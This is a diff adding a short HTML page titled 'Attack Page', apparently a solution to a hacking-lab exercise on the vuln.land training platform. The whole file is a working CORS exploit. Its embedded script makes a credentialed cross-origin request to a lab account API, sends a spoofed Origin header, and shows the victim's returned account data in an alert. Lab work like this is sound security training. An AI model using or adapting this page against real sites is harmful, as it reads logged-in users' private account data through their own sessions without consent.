@@ -1,0 +1,29 @@
+<html>
+  <head>
+    <title>Attack Page</title>
+  </head>
+  <body>
+    <h1>Attack Page</h1>
+    <script>
+      const UUID = "df8c82a5-3846-4281-9ff2-066e1129918b";
+      getAcc();
+
+      async function getAcc() {
+        const accAPI = `https://${UUID}.idocker.vuln.land/api/account`;
+        try {
+          const r = await fetch(accAPI, {
+            method: "GET",
+            credentials: "include",
+            headers: { Origin: accAPI },
+          })
+            .then((response) => response.json())
+            .then((data) => {
+              alert(JSON.stringify(data));
+            });
+        } catch (error) {
+          alert(error);
+        }
+      }
+    </script>
+  </body>
+</html>
